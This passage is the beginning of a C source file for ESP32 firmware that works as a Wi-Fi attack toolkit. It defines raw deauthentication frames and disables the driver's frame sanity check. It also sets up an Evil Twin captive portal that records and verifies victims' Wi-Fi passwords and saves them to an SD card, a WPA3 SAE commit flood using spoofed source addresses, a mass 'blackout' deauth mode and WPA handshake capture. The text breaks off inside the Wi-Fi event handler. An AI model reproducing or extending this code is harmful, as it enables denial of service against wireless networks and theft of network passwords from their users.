// main.c
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include <inttypes.h>
#include <errno.h>
#include <sys/stat.h>
#include <unistd.h>
#include <ctype.h>

#include "esp_heap_caps.h"
#include "esp_psram.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_system.h"
#include "esp_log.h"
#include "esp_err.h"

#include "nvs_flash.h"
#include "nvs.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_event.h"

#include "esp_mac.h"

#include "esp_console.h"
#include "argtable3/argtable3.h"

#include "driver/uart.h"
#include "driver/sdmmc_host.h"
#include "driver/sdspi_host.h"
#include "driver/spi_master.h"
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"
#include <dirent.h>

#include "driver/gpio.h"

#include "led_strip.h"

#include "esp_random.h"
#include "mbedtls/ecp.h"
#include "mbedtls/bignum.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "esp_timer.h"

#include "esp_http_server.h"
#include "esp_netif.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"
#include "lwip/dns.h"
#include "lwip/dhcp.h"

#include "attack_handshake.h"
#include "hccapx_serializer.h"

#include "esp_rom_sys.h"
#include "soc/soc.h"

#if defined(__has_include)
#if __has_include("soc/rtc_cntl_reg.h")
#include "soc/rtc_cntl_reg.h"
#define HAS_RTC_CNTL_REG 1
#endif
#if __has_include("soc/lp_aon_reg.h")
#include "soc/lp_aon_reg.h"
#define HAS_LP_AON_REG 1
#endif
#endif
#ifndef HAS_RTC_CNTL_REG
#define HAS_RTC_CNTL_REG 0
#endif
#ifndef HAS_LP_AON_REG
#define HAS_LP_AON_REG 0
#endif

//Version number
#define JANOS_VERSION "0.7.6"


#define NEOPIXEL_GPIO      27
#define LED_COUNT          1
#define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz

// Boot/flash button (GPIO28) starts sniffer dog on tap, blackout on long-press
#define BOOT_BUTTON_GPIO               28
#define BOOT_BUTTON_TASK_STACK_SIZE    2048
#define BOOT_BUTTON_TASK_PRIORITY      5
#define BOOT_BUTTON_POLL_DELAY_MS      20
#define BOOT_BUTTON_LONG_PRESS_MS      1000

// GPS UART pins (Marauder compatible)
#define GPS_UART_NUM       UART_NUM_1
#define GPS_TX_PIN         13
#define GPS_RX_PIN         14
#define GPS_BUF_SIZE       1024

// SD Card SPI pins (Marauder compatible)
#define SD_MISO_PIN        2
#define SD_MOSI_PIN        7  
#define SD_CLK_PIN         6
#define SD_CS_PIN          10

#define MY_LOG_INFO(tag, fmt, ...) printf("" fmt "\n", ##__VA_ARGS__)

#define MAX_AP_CNT 64
#define MAX_CLIENTS_PER_AP 50
#define MAX_SNIFFER_APS 100
#define MAX_PROBE_REQUESTS 200

static const uint8_t channel_view_24ghz_channels[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
static const uint8_t channel_view_5ghz_channels[] = {
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};

#define CHANNEL_VIEW_24GHZ_CHANNEL_COUNT \
    (sizeof(channel_view_24ghz_channels) / sizeof(channel_view_24ghz_channels[0]))
#define CHANNEL_VIEW_5GHZ_CHANNEL_COUNT \
    (sizeof(channel_view_5ghz_channels) / sizeof(channel_view_5ghz_channels[0]))
#define CHANNEL_VIEW_SCAN_DELAY_MS 2000
#define CHANNEL_VIEW_SCAN_TIMEOUT_ITERATIONS 200

static const char *TAG = "projectZero";

// Probe request data structure
typedef struct {
    uint8_t mac[6];
    char ssid[33];
    int rssi;
    uint32_t last_seen;
} probe_request_t;

// Target BSSID structure for channel monitoring
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t last_seen;
    bool active;
} target_bssid_t;

// Sniffer data structures
typedef struct {
    uint8_t mac[6];
    int rssi;
    uint32_t last_seen;
} sniffer_client_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    wifi_auth_mode_t authmode;
    int rssi;
    sniffer_client_t clients[MAX_CLIENTS_PER_AP];
    int client_count;
    uint32_t last_seen;
} sniffer_ap_t;

// GPS data structure
typedef struct {
    float latitude;
    float longitude;
    float altitude;
    float accuracy;
    bool valid;
} gps_data_t;

// Wardrive state
static bool wardrive_active = false;
static int wardrive_file_counter = 1;
static gps_data_t current_gps = {0};
static bool gps_uart_initialized = false;

// Global stop flag for all operations
static volatile bool operation_stop_requested = false;

// Sniffer state
static sniffer_ap_t sniffer_aps[MAX_SNIFFER_APS];
static int sniffer_ap_count = 0;
static volatile bool sniffer_active = false;
static volatile bool sniffer_scan_phase = false;
static int sniff_debug = 0; // Debug flag for detailed packet logging
static bool sniffer_selected_mode = false; // Flag for selected networks mode
static int sniffer_selected_channels[MAX_AP_CNT]; // Unique channels from selected networks
static int sniffer_selected_channels_count = 0; // Number of unique channels

// Packet monitor state
static volatile bool packet_monitor_active = false;
static volatile uint32_t packet_monitor_total = 0;
static TaskHandle_t packet_monitor_task_handle = NULL;
static uint8_t packet_monitor_prev_primary = 1;
static wifi_second_chan_t packet_monitor_prev_secondary = WIFI_SECOND_CHAN_NONE;
static bool packet_monitor_has_prev_channel = false;
static bool packet_monitor_promiscuous_owned = false;
static bool packet_monitor_callback_installed = false;

// Channel view monitor state
static volatile bool channel_view_active = false;
static volatile bool channel_view_scan_mode = false;
static TaskHandle_t channel_view_task_handle = NULL;

// Probe request storage
static probe_request_t probe_requests[MAX_PROBE_REQUESTS];
static int probe_request_count = 0;

// Channel hopping for sniffer (like Marauder dual-band)
static int sniffer_current_channel = 1;
static int sniffer_channel_index = 0;
static int64_t sniffer_last_channel_hop = 0;
static const int sniffer_channel_hop_delay_ms = 250; // 250ms per channel like Marauder
static TaskHandle_t sniffer_channel_task_handle = NULL;
static uint32_t sniffer_packet_counter = 0;
static uint32_t sniffer_last_debug_packet = 0;

// Deauth/Evil Twin attack task
static TaskHandle_t deauth_attack_task_handle = NULL;
static volatile bool deauth_attack_active = false;

// Blackout attack task
static TaskHandle_t blackout_attack_task_handle = NULL;
static volatile bool blackout_attack_active = false;

// Target BSSID monitoring
#define MAX_TARGET_BSSIDS 50
static target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
static int target_bssid_count = 0;
static uint32_t last_channel_check_time = 0;
static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
static volatile bool periodic_rescan_in_progress = false; // Flag to suppress logs during periodic re-scans

// Client tracking for Evil Twin portal
static volatile int portal_connected_clients = 0;

// SAE Overflow attack task
static TaskHandle_t sae_attack_task_handle = NULL;
static volatile bool sae_attack_active = false;

// Sniffer Dog attack task
static TaskHandle_t sniffer_dog_task_handle = NULL;
static volatile bool sniffer_dog_active = false;
static int sniffer_dog_current_channel = 1;
static int sniffer_dog_channel_index = 0;
static int64_t sniffer_dog_last_channel_hop = 0;

// Wardrive task
static TaskHandle_t wardrive_task_handle = NULL;

// Handshake attack task
static TaskHandle_t handshake_attack_task_handle = NULL;
static volatile bool handshake_attack_active = false;
static bool handshake_selected_mode = false; // true if networks were selected, false for scan-all mode
static wifi_ap_record_t handshake_targets[MAX_AP_CNT]; // Copy of target networks
static int handshake_target_count = 0;
static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
static int handshake_current_index = 0;

// Channel lists for 2.4GHz and 5GHz
static const uint8_t channels_24ghz[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};
static const uint8_t channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
#define NUM_CHANNELS_24GHZ (sizeof(channels_24ghz) / sizeof(channels_24ghz[0]))
#define NUM_CHANNELS_5GHZ (sizeof(channels_5ghz) / sizeof(channels_5ghz[0]))

// Portal state
static httpd_handle_t portal_server = NULL;
static volatile bool portal_active = false;
static TaskHandle_t dns_server_task_handle = NULL;
static int dns_server_socket = -1;
static TaskHandle_t boot_button_task_handle = NULL;

// DNS server configuration
#define DNS_PORT 53
#define DNS_MAX_PACKET_SIZE 512

// Dual-band channel list (2.4GHz + 5GHz like Marauder)
static const int dual_band_channels[] = {
    // 2.4GHz channels
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    // 5GHz channels
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);

// Promiscuous filter (like Marauder)
static const wifi_promiscuous_filter_t sniffer_filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Wardrive buffers (static to avoid stack overflow)
static char wardrive_gps_buffer[GPS_BUF_SIZE];
static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];

// Configurable scan channel time (in ms)
static uint32_t g_scan_min_channel_time = 100;
static uint32_t g_scan_max_channel_time = 300;

#define SCAN_TIME_NVS_NAMESPACE "scancfg"
#define SCAN_TIME_NVS_KEY_MIN   "min_time"
#define SCAN_TIME_NVS_KEY_MAX   "max_time"

static void channel_time_persist_state(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(SCAN_TIME_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Channel time NVS open failed: %s", esp_err_to_name(err));
        return;
    }
    err = nvs_set_u32(handle, SCAN_TIME_NVS_KEY_MIN, g_scan_min_channel_time);
    if (err == ESP_OK) {
        err = nvs_set_u32(handle, SCAN_TIME_NVS_KEY_MAX, g_scan_max_channel_time);
    }
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Channel time NVS save failed: %s", esp_err_to_name(err));
    }
}

static void channel_time_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(SCAN_TIME_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Channel time NVS read open failed: %s", esp_err_to_name(err));
        return;
    }
    uint32_t min_val = 0, max_val = 0;
    err = nvs_get_u32(handle, SCAN_TIME_NVS_KEY_MIN, &min_val);
    if (err == ESP_OK && min_val >= 1 && min_val <= 10000) {
        g_scan_min_channel_time = min_val;
    }
    err = nvs_get_u32(handle, SCAN_TIME_NVS_KEY_MAX, &max_val);
    if (err == ESP_OK && max_val >= 1 && max_val <= 10000) {
        g_scan_max_channel_time = max_val;
    }
    nvs_close(handle);
}

/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);


    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
        //give it a breath:
        vTaskDelay(pdMS_TO_TICKS(20));
        MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM: %d", heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
        return; // lub ponów próbę później
    }

    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
}


enum ApplicationState {
    DEAUTH,
    DEAUTH_EVIL_TWIN,
    EVIL_TWIN_PASS_CHECK,
    IDLE,
    DRAGON_DRAIN,
    SAE_OVERFLOW
};

volatile enum ApplicationState applicationState = IDLE;

static wifi_ap_record_t g_scan_results[MAX_AP_CNT];
static uint16_t g_scan_count = 0;
static volatile bool g_scan_in_progress = false;
static volatile bool g_scan_done = false;
static volatile uint32_t g_last_scan_status = 1; // 0 => success, non-zero => failure/unknown
static int64_t g_scan_start_time_us = 0;

static int g_selected_indices[MAX_AP_CNT];
static int g_selected_count = 0;

char * evilTwinSSID = NULL;
char * evilTwinPassword = NULL;
char * portalSSID = NULL;  // SSID for standalone portal mode
int connectAttemptCount = 0;
led_strip_handle_t strip;
static bool last_password_wrong = false;

typedef struct {
    uint8_t r;
    uint8_t g;
    uint8_t b;
} led_color_t;

#define LED_BRIGHTNESS_MIN        1U
#define LED_BRIGHTNESS_MAX        100U
#define LED_BRIGHTNESS_DEFAULT    5U

static const led_color_t LED_COLOR_IDLE = {0, 255, 0};

static led_color_t led_current_color = {0, 0, 0};
static bool led_initialized = false;
static bool led_user_enabled = true;
static uint8_t led_brightness_percent = LED_BRIGHTNESS_DEFAULT;

#define LED_NVS_NAMESPACE "ledcfg"
#define LED_NVS_KEY_ENABLED "enabled"
#define LED_NVS_KEY_LEVEL   "level"

static uint8_t led_scale_component(uint8_t value) {
    if (value == 0) {
        return 0;
    }
    uint32_t scaled = (uint32_t)value * led_brightness_percent + 99U;
    scaled /= 100U;
    if (scaled > 255U) {
        scaled = 255U;
    }
    return (uint8_t)scaled;
}

static esp_err_t led_commit_color(uint8_t r, uint8_t g, uint8_t b) {
    if (!led_initialized || strip == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    esp_err_t err;
    if (!led_user_enabled || (r == 0 && g == 0 && b == 0)) {
        err = led_strip_clear(strip);
    } else {
        err = led_strip_set_pixel(strip, 0, led_scale_component(r), led_scale_component(g), led_scale_component(b));
    }

    if (err == ESP_OK) {
        err = led_strip_refresh(strip);
    }
    return err;
}

static esp_err_t led_apply_current(void) {
    return led_commit_color(led_current_color.r, led_current_color.g, led_current_color.b);
}

static esp_err_t led_set_color(uint8_t r, uint8_t g, uint8_t b) {
    led_current_color = (led_color_t){r, g, b};
    return led_commit_color(r, g, b);
}

static esp_err_t led_clear(void) {
    led_current_color = (led_color_t){0, 0, 0};
    return led_commit_color(0, 0, 0);
}

static esp_err_t led_set_idle(void) {
    return led_set_color(LED_COLOR_IDLE.r, LED_COLOR_IDLE.g, LED_COLOR_IDLE.b);
}

static esp_err_t led_set_enabled(bool enabled) {
    led_user_enabled = enabled;
    if (!led_initialized) {
        return ESP_OK;
    }
    return led_apply_current();
}

static bool led_is_enabled(void) {
    return led_user_enabled;
}

static esp_err_t led_set_brightness(uint8_t percent) {
    if (percent < LED_BRIGHTNESS_MIN) {
        percent = LED_BRIGHTNESS_MIN;
    } else if (percent > LED_BRIGHTNESS_MAX) {
        percent = LED_BRIGHTNESS_MAX;
    }

    led_brightness_percent = percent;

    if (!led_initialized) {
        return ESP_OK;
    }

    if (!led_user_enabled) {
        return led_commit_color(0, 0, 0);
    }

    return led_apply_current();
}

static void led_persist_state(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(LED_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "LED config save open failed: %s", esp_err_to_name(err));
        return;
    }

    esp_err_t write_err = nvs_set_u8(handle, LED_NVS_KEY_ENABLED, led_user_enabled ? 1U : 0U);
    if (write_err == ESP_OK) {
        write_err = nvs_set_u8(handle, LED_NVS_KEY_LEVEL, led_brightness_percent);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_commit(handle);
    }

    nvs_close(handle);

    if (write_err != ESP_OK) {
        ESP_LOGW(TAG, "LED config save failed: %s", esp_err_to_name(write_err));
    }
}

static void led_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(LED_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "LED config load open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t enabled_value = 0;
    err = nvs_get_u8(handle, LED_NVS_KEY_ENABLED, &enabled_value);
    if (err == ESP_OK) {
        led_user_enabled = enabled_value != 0;
    } else if (err != ESP_ERR_NVS_NOT_FOUND) {
        ESP_LOGW(TAG, "LED enabled read failed: %s", esp_err_to_name(err));
    }

    uint8_t level_value = 0;
    err = nvs_get_u8(handle, LED_NVS_KEY_LEVEL, &level_value);
    if (err == ESP_OK) {
        if (level_value >= LED_BRIGHTNESS_MIN && level_value <= LED_BRIGHTNESS_MAX) {
            led_brightness_percent = level_value;
        } else {
            ESP_LOGW(TAG, "LED brightness %u out of range, keeping %u", level_value, led_brightness_percent);
        }
    } else if (err != ESP_ERR_NVS_NOT_FOUND) {
        ESP_LOGW(TAG, "LED brightness read failed: %s", esp_err_to_name(err));
    }

    nvs_close(handle);
}

static void led_boot_sequence(void) {
    led_user_enabled = true;
    led_brightness_percent = LED_BRIGHTNESS_DEFAULT;
    led_current_color = (led_color_t){0, 0, 0};

    led_load_state_from_nvs();

    if (!led_initialized) {
        return;
    }

    (void)led_commit_color(0, 0, 0);
    vTaskDelay(pdMS_TO_TICKS(50));
    (void)led_set_idle();
    vTaskDelay(pdMS_TO_TICKS(100));
}

// SD card HTML file management
#define MAX_HTML_FILES 50
#define MAX_HTML_FILENAME 64
#define SD_PATH_MAX 192
static char sd_html_files[MAX_HTML_FILES][MAX_HTML_FILENAME];
static int sd_html_count = 0;
static char* custom_portal_html = NULL;
static bool sd_card_mounted = false;
#define MAX_SSID_PRESETS 64
#define MAX_SSID_NAME_LEN 32
#define SSID_PRESET_PATH "/sdcard/lab/ssid.txt"

// Whitelist for BSSID protection
#define MAX_WHITELISTED_BSSIDS 150
typedef struct {
    uint8_t bssid[6];
} whitelisted_bssid_t;
static whitelisted_bssid_t whiteListedBssids[MAX_WHITELISTED_BSSIDS];
static int whitelistedBssidsCount = 0;

#define VENDOR_RECORD_SIZE 64
#define VENDOR_RECORD_NAME_BYTES (VENDOR_RECORD_SIZE - 4)
#define MAX_VENDOR_NAME_LEN (VENDOR_RECORD_NAME_BYTES + 1)
#define SD_OUI_BIN_PATH "/sdcard/lab/oui_wifi.bin"
#define VENDOR_NVS_NAMESPACE "vendorcfg"
#define VENDOR_NVS_KEY_ENABLED "enabled"

// Boot button configuration (stored in NVS)
#define BOOTCFG_NVS_NAMESPACE "bootcfg"
#define BOOTCFG_KEY_SHORT_CMD  "short_cmd"
#define BOOTCFG_KEY_LONG_CMD   "long_cmd"
#define BOOTCFG_KEY_SHORT_EN   "short_en"
#define BOOTCFG_KEY_LONG_EN    "long_en"
#define BOOTCFG_CMD_MAX_LEN    32

static const char* boot_allowed_commands[] = {
    "start_blackout",
    "start_sniffer_dog",
    "channel_view",
    "packet_monitor",
    "start_sniffer",
    "scan_networks",
    "start_wardrive"
};
static const size_t boot_allowed_command_count = sizeof(boot_allowed_commands) / sizeof(boot_allowed_commands[0]);

typedef struct {
    bool enabled;
    char command[BOOTCFG_CMD_MAX_LEN];
} boot_action_config_t;

typedef struct {
    boot_action_config_t short_press;
    boot_action_config_t long_press;
} boot_config_t;

static boot_config_t boot_config = {0};

static char vendor_lookup_buffer[MAX_VENDOR_NAME_LEN];
static bool vendor_file_checked = false;
static bool vendor_file_present = false;
static uint8_t vendor_last_oui[3] = {0};
static bool vendor_last_valid = false;
static bool vendor_last_hit = false;
static bool vendor_lookup_enabled = true;
static size_t vendor_record_count = 0;


// Methods forward declarations
static int cmd_scan_networks(int argc, char **argv);
static int cmd_show_scan_results(int argc, char **argv);
static int cmd_select_networks(int argc, char **argv);
static int cmd_start_evil_twin(int argc, char **argv);
static int cmd_start_handshake(int argc, char **argv);
static int cmd_save_handshake(int argc, char **argv);
static int cmd_start_wardrive(int argc, char **argv);
static int cmd_start_sniffer(int argc, char **argv);
static int cmd_packet_monitor(int argc, char **argv);
static int cmd_channel_view(int argc, char **argv);
static int cmd_show_sniffer_results(int argc, char **argv);
static int cmd_show_probes(int argc, char **argv);
static int cmd_list_probes(int argc, char **argv);
static int cmd_sniffer_debug(int argc, char **argv);
static int cmd_start_blackout(int argc, char **argv);
static int cmd_ping(int argc, char **argv);
static int cmd_boot_button(int argc, char **argv);
static int cmd_start_portal(int argc, char **argv);
static int cmd_start_karma(int argc, char **argv);
static int cmd_list_sd(int argc, char **argv);
static int cmd_list_dir(int argc, char **argv);
static int cmd_list_ssid(int argc, char **argv);
static int cmd_select_html(int argc, char **argv);
static int cmd_file_delete(int argc, char **argv);
static int cmd_stop(int argc, char **argv);
static int cmd_reboot(int argc, char **argv);
static int cmd_led(int argc, char **argv);
static int cmd_vendor(int argc, char **argv);
static int cmd_download(int argc, char **argv);
static int cmd_channel_time(int argc, char **argv);
static esp_err_t start_background_scan(void);
static void print_scan_results(void);
static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
// Target BSSID management functions
static void save_target_bssids(void);
static esp_err_t quick_channel_scan(void);
static bool check_channel_changes(void);
static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count);
// Attack task forward declarations
static void deauth_attack_task(void *pvParameters);
static void blackout_attack_task(void *pvParameters);
static void sae_attack_task(void *pvParameters);
static void handshake_attack_task(void *pvParameters);
static bool check_handshake_file_exists(const char *ssid);
static void handshake_cleanup(void);
static void quick_scan_all_channels(void);
static void attack_network_with_burst(const wifi_ap_record_t *ap);
// DNS server task
static void dns_server_task(void *pvParameters);
// Portal HTTP handlers
static esp_err_t root_handler(httpd_req_t *req);
static esp_err_t portal_handler(httpd_req_t *req);
static esp_err_t login_handler(httpd_req_t *req);
static esp_err_t get_handler(httpd_req_t *req);
static esp_err_t save_handler(httpd_req_t *req);
static esp_err_t android_captive_handler(httpd_req_t *req);
static esp_err_t ios_captive_handler(httpd_req_t *req);
static esp_err_t captive_detection_handler(httpd_req_t *req);
// Sniffer functions
static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void sniffer_process_scan_results(void);
static void sniffer_init_selected_networks(void);
static void sniffer_channel_hop(void);
static void channel_view_task(void *pvParameters);
static void channel_view_stop(void);
static void channel_view_publish_counts(void);
// Packet monitor functions
static void packet_monitor_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void packet_monitor_task(void *pvParameters);
static void packet_monitor_shutdown(void);
static void packet_monitor_stop(void);
// Sniffer Dog functions
static int cmd_start_sniffer_dog(int argc, char **argv);
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void sniffer_dog_task(void *pvParameters);
static void sniffer_dog_channel_hop(void);
static void sniffer_channel_task(void *pvParameters);
static bool is_multicast_mac(const uint8_t *mac);
static bool is_broadcast_bssid(const uint8_t *bssid);
static bool is_own_device_mac(const uint8_t *mac);
static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi);
// Wardrive functions
static esp_err_t init_gps_uart(void);
static esp_err_t init_sd_card(void);
static esp_err_t create_sd_directories(void);
static bool parse_gps_nmea(const char* nmea_sentence);
static void get_timestamp_string(char* buffer, size_t size);
static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
static bool wait_for_gps_fix(int timeout_seconds);
static int find_next_wardrive_file_number(void);
// Portal data logging functions
static void save_evil_twin_password(const char* ssid, const char* password);
static void save_portal_data(const char* ssid, const char* form_data);
// Whitelist functions
static void load_whitelist_from_sd(void);
static bool is_bssid_whitelisted(const uint8_t *bssid);
// SAE WPA3 attack methods forward declarations:
//add methods declarations below:
static void inject_sae_commit_frame();
static void prepareAttack(const wifi_ap_record_t ap_record);
static void update_spoofed_src_random(void);
static int crypto_init(void);
static int trng_random_callback(void *ctx, unsigned char *output, size_t len);
void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type);
static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt);

//add variables declarations below:
//SAE properties:
static int frame_count = 0;
static int64_t start_time = 0;

#define NUM_CLIENTS 20


/* --- mbedTLS Crypto --- */
static mbedtls_ecp_group ecc_group;      // grupa ECC (secp256r1)
static mbedtls_ecp_point ecc_element;      // bieżący element (punkt ECC)
static mbedtls_mpi ecc_scalar;             // bieżący skalar
static mbedtls_ctr_drbg_context ctr_drbg; 
static mbedtls_entropy_context entropy;

/* Router BSSID */
static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};

char * anti_clogging_token = NULL; // Anti-Clogging Token, if any
int actLength = 0; // Length of the Anti-Clogging Token

/* Spoofing base address. Each frame modifies last byte of the address to create a unique source address.*/
static const uint8_t base_srcaddr[6] = { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 };

static uint8_t spoofed_src[6];  // really spoofed source address
static int next_src = 0;        // spoofing index


static const uint8_t auth_req_sae_commit_header[] = {
    0xb0, 0x00, 0x00, 0x00,                   // Frame Control & Duration
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 1 (BSSID – placeholder)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // Address 2 (Source – placeholder)
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 3 (BSSID – placeholder)
    0x00, 0x00,                               // Sequence Control
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00  // SAE Commit fixed part
};

#define AUTH_REQ_SAE_COMMIT_HEADER_SIZE (sizeof(auth_req_sae_commit_header))


int framesPerSecond = 0;

// END of SAE properties








static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data);

static esp_err_t wifi_init_ap_sta(void);
static void register_commands(void);

// --- Wi-Fi event handler ---
static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data) {
    if (event_base == WIFI_EVENT) {
        //MY_LOG_INFO(TAG, "WiFi event: %ld", event_id);
        switch (event_id) {
        case WIFI_EVENT_STA_CONNECTED: {
            const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
            ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                     (const char*)e->ssid, e->channel,
                     e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
            MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
            
            // Mark password as correct
            last_password_wrong = false;
            
            // If portal is active (Evil Twin attack), shut it down after successful connection
            if (portal_active) {
                MY_LOG_INFO(TAG, "Password verified! Shutting down Evil Twin portal...");
                portal_active = false;
                
                // Stop DNS server task
                if (dns_server_task_handle != NULL) {
                    // Wait for DNS task to finish (it checks portal_active flag)
                    for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
                        vTaskDelay(pdMS_TO_TICKS(100));
                    }
                    
                    // Force cleanup if still running
                    if (dns_server_task_handle != NULL) {
                        vTaskDelete(dns_server_task_handle);
                        dns_server_task_handle = NULL;
                        if (dns_server_socket >= 0) {
                            close(dns_server_socket);
                            dns_server_socket = -1;
                        }
                    }
                }
                
                // Stop HTTP server
                if (portal_server != NULL) {
                    httpd_stop(portal_server);
                    portal_server = NULL;
                    MY_LOG_INFO(TAG, "HTTP server stopped.");
                }
                
                // Stop DHCP server
                esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
                if (ap_netif) {
                    esp_netif_dhcps_stop(ap_netif);
                }
                
                // Change WiFi mode from APSTA to STA only (disable AP)
                esp_err_t mode_ret = esp_wifi_set_mode(WIFI_MODE_STA);
                if (mode_ret == ESP_OK) {
                    MY_LOG_INFO(TAG, "WiFi mode changed to STA only - AP disabled.");
                } else {
                    MY_LOG_INFO(TAG, "Failed to change WiFi mode: %s", esp_err_to_name(mode_ret));
                }
                
                MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
                
                // Small delay to ensure all resources are properly released
                vTaskDelay(pdMS_TO_TICKS(500));
                
                // Now save verified password to SD card (after portal is fully closed)
                if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
                    MY_LOG_INFO(TAG, "Saving verified password to SD card...");
                    save_evil_twin_password(evilTwinSSID, evilTwinPassword);
                }
            }
            
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_AP_STACONNECTED: {
            const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
            MY_LOG_INFO(TAG, "AP: Client connected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
            
            // Increment connected clients counter
            portal_connected_clients++;
            MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
            
            // During evil twin attack, switch to first selected network's channel
            if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) && 
                g_selected_count > 0 && target_bssid_count > 0) {
                int idx = g_selected_indices[0];
                uint8_t target_channel = target_bssids[0].channel; // Use first target_bssid (corresponds to first selected network)
                MY_LOG_INFO(TAG, "Client connected to portal - switching to channel %d (first selected network: %s)", 
